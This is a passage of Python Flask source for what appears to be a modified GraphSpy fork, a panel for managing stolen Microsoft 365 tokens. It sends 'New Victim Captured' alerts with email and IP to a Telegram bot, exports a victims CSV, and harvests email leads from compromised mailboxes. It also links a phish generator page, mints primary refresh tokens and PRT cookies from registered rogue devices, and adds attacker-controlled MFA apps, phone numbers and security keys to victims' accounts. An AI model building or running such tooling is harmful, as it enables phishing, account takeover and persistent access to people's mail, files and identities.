        "AttestationObject": base64.urlsafe_b64encode(credential.attestation_object).decode(),
        "ClientDataJson": client_data_json_base64,
        "CredentialId": credential_id_base64,
        "ClientExtensionResults": extension_results_json_base64,
        "PostInfo": "",
        "AAGuid": str(uuid.uuid4()),
        "CredentialDeviceType": "singleDevice"
    }
    response = verify_security_info(access_token_id, 12, None, json.dumps(verification_data, separators=(',',':')))
    if response["ErrorCode"] != 0:
        error_message = get_security_info_error(response["ErrorCode"])
        gspy_log.error(f"Failed to add the security key. Microsoft error message: {error_message}")
        return create_response(400, f"Failed to add the security key. Microsoft error message: {error_message}")
    app.config["add_security_key_status"] = "SUCCESS"
    return create_response(200, f"Successfully added new security key with description '{key_description}' to the account.")

# ========== Teams Functions ==========

def getTeamsSettings(access_token_id):
    # If there are skype settings in the DB already that matches the access_token_id, and it is not expired yet, return those
    teams_settings_db = query_db_json("SELECT * FROM teams_settings WHERE access_token_id = ?",[access_token_id],one=True)
    if teams_settings_db and int(datetime.now().timestamp()) < teams_settings_db["expires_at"]:
        gspy_log.debug("Found teams settings in database. Using those.")
        return teams_settings_db
    # Else, request a new skype token, store it in the DB, and return that
    gspy_log.debug(f"No teams settings found in database for access token with ID {access_token_id}. Requesting new teams settings.")
    access_token = query_db("SELECT accesstoken FROM accesstokens WHERE id = ? AND resource LIKE '%api.spaces.skype.com%'",[access_token_id],one=True)
    if not access_token:
        gspy_log.error(f"No access token with ID {access_token_id} and resource containing 'api.spaces.skype.com'!")
        return False
    access_token = access_token[0]
    headers = {"Authorization":f"Bearer {access_token}", "User-Agent":get_user_agent()}
    uri = "https://teams.microsoft.com/api/authsvc/v1.0/authz"
    response = requests.post(uri, headers=headers)
    if response.status_code != 200:
        gspy_log.error(f"Failed obtaining teams settings. Received status code {response.status_code}")
        return False
    try:
        teams_settings_json = response.json()
        skype_token = teams_settings_json["tokens"]["skypeToken"]
        decoded_skype_token = jwt.decode(skype_token, options={"verify_signature": False})
        teams_settings_string = json.dumps(teams_settings_json)
        execute_db("INSERT OR REPLACE INTO teams_settings (access_token_id, skypeToken, skype_id, issued_at, expires_at, teams_settings_raw) VALUES (?,?,?,?,?,?)",(
                access_token_id,
                skype_token,
                decoded_skype_token["skypeid"],
                decoded_skype_token["iat"],
                decoded_skype_token["exp"],
                teams_settings_string
                )
            )
        teams_settings_db = query_db_json("SELECT * FROM teams_settings WHERE access_token_id = ?",[access_token_id],one=True)
        if teams_settings_db:
            return teams_settings_db
    except Exception as e:
        gspy_log.error(f"Failed extracting teams settings from response.")
        traceback.print_exc()
    return False

def safe_join(directory, filename):
    # Safely join `directory` and `filename`.
    os_seps = list(sep for sep in [os.path.sep, os.path.altsep] if sep != None)
    filename = os.path.normpath(filename)
    for sep in os_seps:
        if sep in filename:
            return False
    if os.path.isabs(filename) or filename.startswith('../'):
        return False
    if not os.path.normpath(os.path.join(directory,filename)).startswith(directory):
        return False
    return os.path.join(directory, filename)

def init_routes():

    # ========== Telegram Notifications ==========

    def send_telegram_notification(email, ip_addr):
        """Send a Telegram notification when a new victim authenticates."""
        try:
            bot_token = query_db("SELECT value FROM settings WHERE setting = 'tg_bot_token'", one=True)
            chat_id = query_db("SELECT value FROM settings WHERE setting = 'tg_chat_id'", one=True)
            if not bot_token or not chat_id or not bot_token[0] or not chat_id[0]:
                return
            from datetime import datetime
            msg = f"🎯 New Victim Captured\n\n📧 {email}\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n🌐 IP: {ip_addr}"
            url = f"https://api.telegram.org/bot{bot_token[0]}/sendMessage"
            requests.post(url, data={"chat_id": chat_id[0], "text": msg, "parse_mode": "HTML"}, timeout=5)
        except:
            pass

    @app.route("/api/get_telegram")
    def api_get_telegram():
        bot = query_db("SELECT value FROM settings WHERE setting = 'tg_bot_token'", one=True)
        chat = query_db("SELECT value FROM settings WHERE setting = 'tg_chat_id'", one=True)
        return json.dumps({"bot_token": bot[0] if bot else "", "chat_id": chat[0] if chat else ""})

    @app.post("/api/set_telegram")
    def api_set_telegram():
        execute_db("INSERT OR REPLACE INTO settings (setting, value) VALUES ('tg_bot_token', ?)", (request.form.get('bot_token', ''),))
        execute_db("INSERT OR REPLACE INTO settings (setting, value) VALUES ('tg_chat_id', ?)", (request.form.get('chat_id', ''),))
        return "saved"

    @app.post("/api/test_telegram")
    def api_test_telegram():
        try:
            bot_token = request.form.get('bot_token', '')
            chat_id = request.form.get('chat_id', '')
            msg = "✅ GraphSpy Telegram test — notifications are working!"
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            r = requests.post(url, data={"chat_id": chat_id, "text": msg}, timeout=5)
            return "sent" if r.status_code == 200 else f"error: {r.text[:100]}", r.status_code
        except Exception as e:
            return str(e), 500

    # ========== Authentication ==========

    import hashlib
    app.secret_key = os.urandom(32)

    def get_panel_password():
        """Get the panel password from settings, or return None if not set."""
        try:
            row = query_db("SELECT value FROM settings WHERE setting = 'panel_password'", one=True)
            return row[0] if row else None
        except:
            return None

    @app.before_request
    def require_login():
        """Protect all pages if password is set."""
        from flask import session
        # Always allow these paths
        exempt = ['/login', '/static/', '/api/']
        if any(request.path.startswith(e) for e in exempt):
            return
        # Check if password protection is enabled
        try:
            pwd = get_panel_password()
        except:
            return  # No password set or DB error = open access
        if not pwd:
            return  # No password set = open access
        # Password is set — check session
        if not session.get('authenticated', False):
            return redirect('/login')

    @app.route("/login", methods=["GET", "POST"])
    def login():
        from flask import session
        pwd = get_panel_password()
        if not pwd:
            session['authenticated'] = True
            return redirect('/')
        if request.method == "POST":
            entered = request.form.get('password', '')
            hashed = hashlib.sha256(entered.encode()).hexdigest()
            if hashed == pwd:
                session['authenticated'] = True
                return redirect('/')
            return render_template('login.html', title="Login", error="Wrong password")
        return render_template('login.html', title="Login", error=None)

    @app.route("/logout")
    def logout():
        from flask import session
        session.pop('authenticated', None)
        return redirect('/login')

    @app.route("/api/set_panel_password", methods=["POST"])
    def api_set_panel_password():
        new_pwd = request.form.get('password', '')
        if new_pwd:
            hashed = hashlib.sha256(new_pwd.encode()).hexdigest()
            execute_db("INSERT OR REPLACE INTO settings (setting, value) VALUES ('panel_password', ?)", (hashed,))
            return "Password set", 200
        else:
            execute_db("DELETE FROM settings WHERE setting = 'panel_password'")
            from flask import session
            session['authenticated'] = True
            return "Password removed", 200

    # ========== Pages ==========

    @app.route("/")
    @app.route("/users")
    def users_home():
        return render_template('users_table.html', title="Users")

    @app.route("/settings")
    def settings():
        return render_template('settings.html', title="Settings")

    # ========== Users API ==========

    @app.route("/api/list_users")
    def api_list_users():
        """Return deduplicated user list from access + refresh tokens."""
        users = {}
        # Gather from access tokens
        rows = query_db_json("SELECT * FROM accesstokens")
        for row in rows:
            token_str = row.get("accesstoken", "")
            user_email = row.get("user", "unknown")
            resource = row.get("resource", "")
            if not user_email or user_email == "unknown":
                continue
            if user_email not in users:
                users[user_email] = {"email": user_email, "name": "", "access_token_id": 0, "refresh_token_id": 0, "resource": "", "stored_at": "", "scopes": "", "country": ""}
            # Prefer graph-scoped tokens
            if "graph.microsoft.com" in resource or users[user_email]["access_token_id"] == 0:
                users[user_email]["access_token_id"] = row["id"]
                users[user_email]["resource"] = resource
                users[user_email]["stored_at"] = row.get("stored_at", "")
            # Try to decode name, scopes, and country from token
            try:
                decoded = jwt.decode(token_str, options={"verify_signature": False})
                name = decoded.get("name", "")
                if name and not users[user_email]["name"]:
                    users[user_email]["name"] = name
                scp = decoded.get("scp", "")
                if scp and (not users[user_email]["scopes"] or "graph.microsoft.com" in resource):
                    users[user_email]["scopes"] = scp
                # Extract country from ipaddr via cached GeoIP, fallback to ctry claim
                ipaddr = decoded.get("ipaddr", "")
                if ipaddr:
                    # Check cache in settings table
                    cached_cc = query_db("SELECT value FROM settings WHERE setting = ?", [f"ip_country_{ipaddr}"], one=True)
                    if cached_cc:
                        users[user_email]["country"] = cached_cc[0]
                if not users[user_email]["country"]:
                    country = decoded.get("ctry", "") or decoded.get("country", "")
                    if country:
                        users[user_email]["country"] = country
            except:
                pass
        # Gather refresh token IDs
        rt_rows = query_db_json("SELECT * FROM refreshtokens")
        for row in rt_rows:
            user_email = row.get("user", "")
            if user_email in users:
                # Prefer the latest refresh token
                if row["id"] > users[user_email]["refresh_token_id"]:
                    users[user_email]["refresh_token_id"] = row["id"]
        # Add admin count and leads count per user
        for email, u in users.items():
            domain = email.split("@")[1] if "@" in email else ""
            # Admin count
            try:
                admin_row = query_db("SELECT admins_json FROM cached_admins WHERE domain = ?", [domain], one=True)
                if admin_row and admin_row[0]:
                    admins = json.loads(admin_row[0])
                    u["admin_count"] = len([a for a in admins if not a.get("error")])
                else:
                    u["admin_count"] = 0
            except:
                u["admin_count"] = 0
            # Email leads count
            try:
                leads_row = query_db("SELECT COUNT(*) FROM email_leads WHERE user_email = ?", [email], one=True)
                u["leads_count"] = leads_row[0] if leads_row else 0
            except:
                u["leads_count"] = 0
        return json.dumps(list(users.values()))

    @app.route("/api/download_db")
    def api_download_db():
        """Download the ENTIRE GraphSpy database file."""
        db_path = app.config['graph_spy_db_path']
        return flask.helpers.send_file(db_path, as_attachment=True, download_name=os.path.basename(db_path))

    # ========== Cached Global Admins ==========

    @app.route("/api/cached_admins/<domain>")
    def api_get_cached_admins(domain):
        """Get cached global admins for a domain. Returns null if not cached."""
        row = query_db_json("SELECT * FROM cached_admins WHERE domain = ?", [domain], one=True)
        if row:
            return json.dumps({"domain": row["domain"], "admins": json.loads(row["admins_json"]), "fetched_at": row["fetched_at"]})
        return json.dumps(None)

    @app.post("/api/cached_admins/<domain>")
    def api_save_cached_admins(domain):
        """Save global admins for a domain."""
        admins = request.form.get("admins_json", "[]")
        from datetime import datetime
        now = datetime.now().isoformat()
        execute_db("INSERT OR REPLACE INTO cached_admins (domain, admins_json, fetched_at) VALUES (?, ?, ?)", (domain, admins, now))
        return "saved"

    # ========== Email Leads ==========

    @app.route("/api/email_leads/<user_email>")
    def api_get_email_leads(user_email):
        """Get all cached email leads for a user."""
        rows = query_db_json("SELECT * FROM email_leads WHERE user_email = ?", [user_email])
        return json.dumps(rows)

    @app.post("/api/email_leads/save")
    def api_save_email_leads():
        """Save a batch of email leads."""
        data = request.get_json() or {}
        user_email = data.get("user_email", "")
        leads = data.get("leads", [])
        from datetime import datetime
        now = datetime.now().isoformat()
        saved = 0
        for lead in leads:
            try:
                execute_db("INSERT OR IGNORE INTO email_leads (user_email, lead_email, lead_name, source, first_seen) VALUES (?, ?, ?, ?, ?)",
                    (user_email, lead.get("email",""), lead.get("name",""), lead.get("source",""), now))
                saved += 1
            except:
                pass
        return json.dumps({"saved": saved})

    @app.route("/api/email_leads/last_enriched/<user_email>")
    def api_email_leads_last_enriched(user_email):
        """Check when leads were last enriched."""
        row = query_db("SELECT MAX(first_seen) as last FROM email_leads WHERE user_email = ?", [user_email], one=True)
        return json.dumps({"last": row[0] if row and row[0] else None})

    # ========== Cloudflare Settings ==========

    @app.route("/api/get_cf_settings")
    def api_get_cf_settings():
        """Get Cloudflare credentials from settings."""
        token = query_db("SELECT value FROM settings WHERE setting = 'cf_api_token'", one=True)
        account = query_db("SELECT value FROM settings WHERE setting = 'cf_account_id'", one=True)
        return json.dumps({
            "api_token": token[0] if token else "",
            "account_id": account[0] if account else ""
        })

    @app.post("/api/set_cf_settings")
    def api_set_cf_settings():
        """Save Cloudflare credentials to settings."""
        token = request.form.get("api_token", "")
        account = request.form.get("account_id", "")
        execute_db("INSERT OR REPLACE INTO settings (setting, value) VALUES ('cf_api_token', ?)", (token,))
        execute_db("INSERT OR REPLACE INTO settings (setting, value) VALUES ('cf_account_id', ?)", (account,))
        return "saved"

    @app.route("/api/download_victims_csv")
    def api_download_victims_csv():
        """Download victims list as CSV."""
        users = {}
        rows = query_db_json("SELECT * FROM accesstokens")
        for row in rows:
            user_email = row.get("user", "unknown")
            if not user_email or user_email == "unknown":
                continue
            if user_email not in users:
                users[user_email] = {"email": user_email, "name": "", "resource": "", "stored_at": ""}
            try:
                decoded = jwt.decode(row.get("accesstoken", ""), options={"verify_signature": False})
                name = decoded.get("name", "")
                if name and not users[user_email]["name"]:
                    users[user_email]["name"] = name
            except:
                pass
            users[user_email]["stored_at"] = row.get("stored_at", "")
            users[user_email]["resource"] = row.get("resource", "")
        csv = "Email,Name,Resource,Captured At\n"
        for u in users.values():
            csv += f'"{u["email"]}","{u["name"]}","{u["resource"]}","{u["stored_at"]}"\n'
        return csv, 200, {'Content-Type': 'text/csv', 'Content-Disposition': 'attachment; filename=victims.csv'}

    @app.route("/api/download_email_leads/<user_email>")
    def api_download_email_leads(user_email):
        """Download extracted email leads for a specific user as CSV."""
        rows = query_db_json("SELECT lead_email, lead_name, source, first_seen FROM email_leads WHERE user_email = ? ORDER BY lead_email", [user_email])
        csv = "Email,Name,Source,First Seen\n"
        for r in rows:
            csv += f'"{r.get("lead_email","")}","{r.get("lead_name","")}","{r.get("source","")}","{r.get("first_seen","")}"\n'
        safe_name = user_email.replace("@", "_at_").replace(".", "_")
        return csv, 200, {'Content-Type': 'text/csv', 'Content-Disposition': f'attachment; filename=email-leads-{safe_name}.csv'}

    @app.route("/phish_generator")
    def phish_generator():
        return render_template('phish_generator.html', title="Phish Generator")

    @app.route("/access_tokens")
    def access_tokens():
        return render_template('access_tokens.html', title="Access Tokens")

    @app.route("/refresh_tokens")
    def refresh_tokens():
        return render_template('refresh_tokens.html', title="Refresh Tokens")
    
    @app.route("/device_certificates")
    def device_certificates():
        return render_template('device_certificates.html', title="Device Certificates")

    @app.route("/primary_refresh_tokens")
    def primary_refresh_tokens():
        return render_template('primary_refresh_tokens.html', title="Primary Refresh Tokens")

    @app.route("/winhello_keys")
    def winhello_keys():
        return render_template('winhello_keys.html', title="Windows Hello Keys")

    @app.route("/device_codes")
    def device_codes():
        return render_template('device_codes.html', title="Device Codes")

    @app.route("/mfa")
    def mfa():
        return render_template('mfa.html', title="MFA Methods")

    @app.route("/custom_requests")
    def custom_requests():
        return render_template('custom_requests.html', title="Custom Requests")

    @app.route("/generic_search")
    def generic_search():
        return render_template('generic_search.html', title="Generic MSGraph Search")

    @app.route("/recent_files")
    def recent_files():
        return render_template('recent_files.html', title="Recent Files")

    @app.route("/shared_with_me")
    def shared_with_me():
        return render_template('shared_with_me.html', title="Files Shared With Me")

    @app.route("/onedrive")
    def onedrive():
        return render_template('OneDrive.html', title="OneDrive")

    @app.route("/sharepoint_sites")
    def sharepoint_sites():
        return render_template('SharePointSites.html', title="SharePoint Sites")
    
    @app.route("/sharepoint_drives")
    def sharepoint_drives():
        return render_template('SharePointDrives.html', title="SharePoint Drives")
    
    @app.route("/sharepoint")
    def sharepoint():
        return render_template('SharePoint.html', title="SharePoint")
        
    @app.route("/outlook")
    def outlook():
        return render_template('outlook.html', title="Outlook Web")

    @app.route("/outlook_graph")
    def outlook_graph():
        return render_template('outlook_graph.html', title="Outlook")
        
    @app.route("/teams")
    def teams():
        return render_template('teams.html', title="Microsoft Teams")

    @app.route("/entra_users")
    def entra_users():
        return render_template('entra_users.html', title="Entra ID Users")

    # ========== API ==========

        # ========== Device Codes ==========

    @app.route("/api/list_device_codes")
    def api_list_device_codes():
        rows = query_db_json("select * from devicecodes")
        # Convert unix timestamps to formated datetime strings before returning
        [row.update(generated_at=f"{datetime.fromtimestamp(row['generated_at'])}") for row in rows]
        [row.update(expires_at=f"{datetime.fromtimestamp(row['expires_at'])}") for row in rows]
        [row.update(last_poll=f"{datetime.fromtimestamp(row['last_poll'])}") for row in rows]
        return json.dumps(rows)

    @app.post("/api/restart_device_code_polling")
    def api_restart_device_code_polling():
        return start_device_code_thread()

    @app.post('/api/generate_device_code')
    def api_generate_device_code():
        version = int(request.form.get('version','1')) if request.form.get('version','1').isdigit() else 1
        client_id = request.form.get('client_id') or "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        resource = request.form.get('resource') or "https://graph.microsoft.com"
        scope = request.form.get('scope') or "https://graph.microsoft.com/.default openid offline_access"
        ngcmfa = request.form.get('ngcmfa') == "true"
        cae = request.form.get('cae') == "true"
        auto_action = request.form.get('auto_action')
        if auto_action and auto_action != "none":
            auto_device_name = request.form.get('auto_device_name') or "GraphSpy-Device"
            auto_join_type = int(request.form.get('auto_join_type')) if request.form.get('auto_join_type') else 0
            auto_device_type = request.form.get('auto_device_type') or "Windows"
            auto_os_version = request.form.get('auto_os_version') or "10.0.26100"
            auto_target_domain = request.form.get('auto_target_domain') or "e-corp.local"
            user_code = device_code_flow(version,client_id,resource,scope,ngcmfa,cae,auto_action,auto_device_name,auto_join_type,auto_device_type,auto_os_version,auto_target_domain)
        else:
            user_code = device_code_flow(version,client_id,resource,scope,ngcmfa,cae)
        return user_code

    @app.route("/api/delete_device_code/<id>")
    def api_delete_device_code(id):
        execute_db("DELETE FROM devicecodes where id = ?",[id])
        return "true"
    
        # ========== PRT ==========

    @app.post("/api/register_device")
    def api_register_device():
        if not "access_token_id" in request.form:
            return create_response(400, "[Error] No access_token_id specified.")
        access_token_id = request.form['access_token_id']
        device_name = request.form.get('device_name') or "GraphSpy-Device"
        join_type = int(request.form.get('join_type')) if request.form.get('join_type') else 0
        device_type = request.form.get('device_type') or "Windows"
        os_version = request.form.get('os_version') or "10.0.26100"
        target_domain = request.form.get('target_domain') or "e-corp.local"
        device_id = register_device(access_token_id, device_name, join_type, device_type, os_version, target_domain)
        if not device_id:
            return create_response(400, "Failed to register device.")
        return create_response(200, f"Successfully registered new device with Device ID {device_id}.", {"device_id": device_id})

    @app.post("/api/import_device_certificate")
    def api_import_device_certificate():
        certificate_base64 = request.form.get('certificate_base64')
        if not certificate_base64:
            return create_response(400, "[Error] No certificate_base64 specified.")
        private_key_pem_base64 = request.form.get('private_key_pem_base64')
        if not private_key_pem_base64:
            return create_response(400, "[Error] No private_key_pem_base64 specified.")
        device_id = request.form.get('device_id')
        if not device_id:
            try:  
                from cryptography import x509
                from cryptography.x509.oid import NameOID
                certificate = x509.load_der_x509_certificate(base64.b64decode(certificate_base64))
                device_id = certificate.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value
            except:
                return create_response(400, "[Error] Invalid certificate format.")
        device_name = request.form.get('device_name') or "GraphSpy-Device"
        device_type = request.form.get('device_type') or "Windows"
        join_type = int(request.form.get('join_type')) if request.form.get('join_type') else 0
        device_certificate_id = execute_db("INSERT INTO device_certificates (stored_at, device_id, device_name, device_type, join_type, priv_key, certificate) VALUES (?, ?, ?, ?, ?, ?, ?)", (
            int(time.time()),
            device_id, 
            device_name, 
            device_type, 
            "joined" if join_type == 0 else "registered" if join_type == 4 else "unknown", 
            private_key_pem_base64, 
            certificate_base64
        ))
        if device_certificate_id:
            return create_response(200, f"Successfully added device certificate with ID {device_certificate_id} to the database.", {"device_certificate_id": device_certificate_id})
        else:
            return create_response(400, "[Error] Failed to add device certificate to database.")

    @app.route("/api/list_device_certificates")
    def api_list_device_certificates():
        rows = query_db_json("SELECT * FROM device_certificates")
        return create_response(200, data=rows)
    
    @app.post("/api/delete_device_certificate")
    def api_delete_device_certificate():
        if not "id" in request.form:
            return create_response(400, "[Error] No id specified.")
        id = request.form['id']
        execute_db("DELETE FROM device_certificates WHERE id = ?",[id])
        return create_response(200, f"Deleted device certificate with ID {id}.")

    @app.post("/api/request_prt_for_device")
    def api_request_prt_for_device():
        if not "device_id" in request.form and not "id" in request.form:
            return create_response(400, "[Error] No 'device_id' or 'id' specified.")
        if "device_id" in request.form and request.form['device_id']:
            device_id = request.form['device_id']
        else:
            device_id = query_db("SELECT device_id FROM device_certificates WHERE id = ?",[request.form['id']],one=True)
        if not "refresh_token_id" in request.form:
            return create_response(400, "[Error] No refresh_token_id specified.")
        refresh_token_id = request.form['refresh_token_id']
        os_version = request.form.get('os_version') or "10.0.26100"
        prt_id = request_prt_for_device(device_id, refresh_token_id, os_version)
        if not prt_id:
            return create_response(400, f"Failed to request PRT for device with ID {device_id}.")
        return create_response(200, f"Successfully requested PRT with ID {prt_id}.", {"prt_id": prt_id})

    @app.post("/api/import_prt")
    def api_import_prt():
        prt = request.form.get('prt')
        if not prt:
            return create_response(400, "[Error] No prt specified.")
        session_key = request.form.get('session_key')
        if not session_key:
            return create_response(400, "[Error] No session_key specified.")
        device_id = request.form.get('device_id') or "Unknown"
        user = request.form.get('user') or "Unknown"
        issued_at = request.form.get('issued_at') or None
        if type(issued_at) != int:
            try:
                issued_at = int(issued_at)
            except:
                issued_at = None
        expires_at = request.form.get('expires_at') or None
        if type(expires_at) != int:
            try:
                expires_at = int(expires_at)
            except:
                expires_at = None
        description = request.form.get('description') or f"Manually added at {str(datetime.now()).split('.')[0]}"
        prt_id = execute_db("INSERT INTO primary_refresh_tokens (device_id, user, prt, session_key, issued_at, expires_at, description) VALUES (?, ?, ?, ?, ?, ?, ?)", (
            device_id, 
            user, 
            prt, 
            session_key, 
            issued_at, 
            expires_at, 
            description
        ))
        if prt_id:
            return create_response(200, f"Successfully added PRT with ID {prt_id} to the database.", {"prt_id": prt_id})
        else:
            return create_response(400, "[Error] Failed to add PRT to database.")

    @app.route("/api/list_primary_refresh_tokens")
    def api_list_primary_refresh_tokens():
        rows = query_db_json("SELECT * FROM primary_refresh_tokens")
        return create_response(200, data=rows)
    
    @app.route("/api/get_primary_refresh_token/<id>")
    def api_get_primary_refresh_token(id):
        rows = query_db_json("SELECT * FROM primary_refresh_tokens WHERE id = ?",[id],one=True)
        if not rows:
            return create_response(400, f"No primary refresh token with ID {id} found.")
        return create_response(200, data=rows)

    @app.post("/api/delete_primary_refresh_token")
    def api_delete_primary_refresh_token():
        if not "id" in request.form:
            return create_response(400, "[Error] No id specified.")
        id = request.form['id']
        execute_db("DELETE FROM primary_refresh_tokens WHERE id = ?",[id])
        return create_response(200, f"Deleted primary refresh token with ID {id}.")
    
    @app.post("/api/refresh_prt_to_access_token")
    def api_refresh_prt_to_access_token():
        if not "prt_id" in request.form:
            return create_response(400, "[Error] No prt_id specified.")
        prt_id = request.form['prt_id']
        client_id = request.form.get('client_id') or "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        resource = request.form.get('resource') or "https://graph.microsoft.com"
        refresh_prt = request.form.get('refresh_prt', "true").lower() == "true"
        redirect_uri = request.form.get('redirect_uri', None)
        access_token_id = refresh_prt_to_access_token(prt_id, client_id, resource, refresh_prt, redirect_uri)
        return create_response(200, f"Successfully refreshed PRT to access token with ID {access_token_id}.", {"access_token_id": access_token_id})
    
    @app.route("/api/active_prt/<id>")
    def api_set_active_prt(id):
        previous_id = query_db("SELECT value FROM settings WHERE setting = 'active_prt_id'",one=True)
        if not previous_id:
            execute_db("INSERT INTO settings (setting, value) VALUES ('active_prt_id',?)",(id,))
        else:
            execute_db("UPDATE settings SET value = ? WHERE setting = 'active_prt_id'",(id,))
        return id

    @app.route("/api/active_prt")
    def api_get_active_prt():
        active_prt = query_db("SELECT value FROM settings WHERE setting = 'active_prt_id'",one=True)
        return f"{active_prt[0]}" if active_prt else "0"
    
    @app.post("/api/generate_prt_cookie")
    def api_generate_prt_cookie():
        if not "prt_id" in request.form:
            return create_response(400, "[Error] No prt_id specified.")
        prt_id = request.form['prt_id']
        prt_cookie = generate_prt_cookie(prt_id)
        return create_response(200, f"Successfully generated PRT cookie using PRT {prt_id}.", {"prt_cookie": prt_cookie})
    
    @app.post("/api/register_winhello")
    def api_register_winhello():
        if not "access_token_id" in request.form:
            return create_response(400, "[Error] No access_token_id specified.")
        access_token_id = request.form['access_token_id']
        winhello_id = register_winhello(access_token_id)
        return create_response(200, f"Successfully registered WinHello for device with ID {winhello_id}.", {"winhello_id": winhello_id})
    
    @app.post("/api/import_winhello_key")
    def api_import_winhello_key():
        private_key_pem_base64 = request.form.get('private_key_pem_base64')
        if not private_key_pem_base64:
            return create_response(400, "[Error] No private_key_pem_base64 specified.")
        device_id = request.form.get('device_id')
        if not device_id:
            return create_response(400, "[Error] No device_id specified.")
        user = request.form.get('user')
        if not user:
            return create_response(400, "[Error] No user specified.")
        key_id = request.form.get('key_id') or "Unknown"
        winhello_key_id = execute_db("INSERT INTO winhello_keys (stored_at, key_id, device_id, user, priv_key) VALUES (?, ?, ?, ?, ?)", (
            int(time.time()),
            key_id, 
            device_id, 
            user, 
            private_key_pem_base64
        ))
        if winhello_key_id:
            return create_response(200, f"Successfully added WinHello key with ID {winhello_key_id} to the database.", {"winhello_key_id": winhello_key_id})
        else:
            return create_response(400, "[Error] Failed to add WinHello key to database.")

    @app.route("/api/list_winhello_keys")
    def api_list_winhello_keys():
        rows = query_db_json("SELECT * FROM winhello_keys")
        return create_response(200, data=rows)

    @app.post("/api/winhello_to_prt")
    def api_winhello_to_prt():
        if not "winhello_id" in request.form:
            return create_response(400, "[Error] No winhello_id specified.")
        winhello_id = request.form['winhello_id']
        device_id = request.form.get('device_id') 
        winhello_username = request.form.get('winhello_username') 
        if not device_id and "device_db_id" in request.form:
            device_id = query_db("SELECT device_id FROM device_certificates WHERE id = ?",[request.form['device_db_id']],one=True) or None
        prt_id = winhello_to_prt(winhello_id, device_id, winhello_username)
        return create_response(200, f"Successfully used WinHello key to obtain PRT with ID {prt_id}.", {"prt_id": prt_id})

    @app.post("/api/delete_winhello_key")
    def api_delete_winhello_key():
        if not "id" in request.form:
            return create_response(400, "[Error] No id specified.")
        id = request.form['id']
        execute_db("DELETE FROM winhello_keys WHERE id = ?", [id])
        return create_response(200, f"Successfully deleted WinHello key with ID {id}.")

        # ========== MFA ==========

    @app.post("/api/get_available_authentication_info")
    def api_get_available_authentication_info():
        if not "access_token_id" in request.form:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.form['access_token_id']
        availableAuthenticationInfo = get_available_authentication_info(access_token_id)
        if not availableAuthenticationInfo:
            return f"[Error] Failed to obtain Available Authentication Info.", 400
        return availableAuthenticationInfo

    @app.post("/api/add_phone_number")
    def api_add_phone_number():
        if not "access_token_id" in request.form:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.form['access_token_id']
        if not "country_code" in request.form:
            return f"[Error] No country_code specified.", 400
        country_code = request.form['country_code']
        if not "phone_number" in request.form:
            return f"[Error] No phone_number specified.", 400
        phone_number = request.form['phone_number']
        phone_type = request.form['phone_type'] if "phone_type" in request.form else "mobilePhone_sms"
        if not phone_type in ["mobilePhone_sms", "mobilePhone_call", "altMobilePhone", "officePhone"]:
            return f"[Error] Unknown phone_type specified. Allowed options: mobilePhone_sms, mobilePhone_call, altMobilePhone, officePhone", 400
        
        add_phone_number_response = add_phone_number(access_token_id, country_code, phone_number, phone_type)
        if not add_phone_number_response:
            return f"[Error] Failed to add phone number.", 400
        return add_phone_number_response

    @app.post("/api/add_email")
    def api_add_email():
        if not "access_token_id" in request.form:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.form['access_token_id']
        if not "email" in request.form:
            return f"[Error] No email specified.", 400
        email = request.form['email']

        security_info_response = add_security_info(access_token_id, 8, email)
        if (not security_info_response):
            gspy_log.error(f"Failed adding email address.")
            return f"[Error] Failed adding email address.", 400
        if "captcha" in security_info_response:
            return security_info_response
        if (not ("VerificationContext" in security_info_response)) or (not (security_info_response["VerificationContext"])):
            gspy_log.error(f"Adding email address failed. Received response: \n{security_info_response}")
            return f"[Error] Failed adding email address.", 400
        return security_info_response

    @app.post("/api/add_mfa_app")
    def api_add_mfa_app():
        if not "access_token_id" in request.form:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.form['access_token_id']
        if not "security_info_type" in request.form:
            return f"[Error] No security_info_type specified.", 400
        security_info_type = request.form['security_info_type']
        if not "secret_key" in request.form:
            return f"[Error] No secret_key specified.", 400
        secret_key = request.form['secret_key']
        
        add_mfa_app_response = add_mfa_app(access_token_id, security_info_type, secret_key)
        if not add_mfa_app_response:
            return f"[Error] Failed to add MFA app.", 400
        return add_mfa_app_response
        
    @app.post("/api/list_graphspy_otp")
    def api_list_graphspy_otp():
        rows = query_db_json("select * from mfa_otp")
        return json.dumps(rows)

    @app.post("/api/add_graphspy_otp")
    def api_add_graphspy_otp():
        if not "access_token_id" in request.form:
            return f"[Error] No access_token_id specified.", 400
        access_token_id = request.form['access_token_id']
        description = request.form['description'] if "description" in request.form else ""
        
        add_graphspy_otp_response = add_graphspy_otp(access_token_id, description)
        if not add_graphspy_otp_response:
            return "[Error] Failed to add GraphSpy OTP code to account.", 400
        return f"[Success] Added GraphSpy OTP code with secret '{add_graphspy_otp_response}' to account!"
        
    @app.post("/api/delete_graphspy_otp")
    def api_delete_graphspy_otp():
        try:
            if not "otp_code_id" in request.form:
                return f"[Error] No otp_code_id specified.", 400
            otp_code_id = request.form["otp_code_id"]
            execute_db("DELETE FROM mfa_otp WHERE id = ?",[otp_code_id])
            return f"[Success] OTP code with ID {otp_code_id} deleted from database."
        except Exception as e:
            traceback.print_exc()
            return "[Error] Failed to delete OTP code.", 400

    @app.post("/api/generate_otp_code")
    def api_generate_otp_code():
        try:
            if not "secret_key" in request.form:
                return f"[Error] No secret_key specified.", 400
            secret_key = request.form['secret_key']
            otp_code = pyotp.TOTP(secret_key).now()
            return otp_code
        except Exception as e:
            traceback.print_exc()
            return "[Error] Failed to create OTP code from the provided secret key.", 400

    @app.post("/api/add_security_key")
    def api_add_security_key():
        try:
            if not "access_token_id" in request.form:
                return f"[Error] No access_token_id specified.", 400
            access_token_id = request.form['access_token_id']
            if not "client_type" in request.form:
                return f"[Error] No client_type specified.", 400
            client_type = request.form['client_type']
            description = request.form['description'] if "description" in request.form and request.form['description'] else "GraphSpy Key"
            device_pin = request.form['device_pin'] if "device_pin" in request.form else ""
        
            add_security_key_response = add_security_key(access_token_id, description, client_type, device_pin)
            if app.config["add_security_key_status"] != "SUCCESS":
                app.config["add_security_key_status"] = "FAILED"
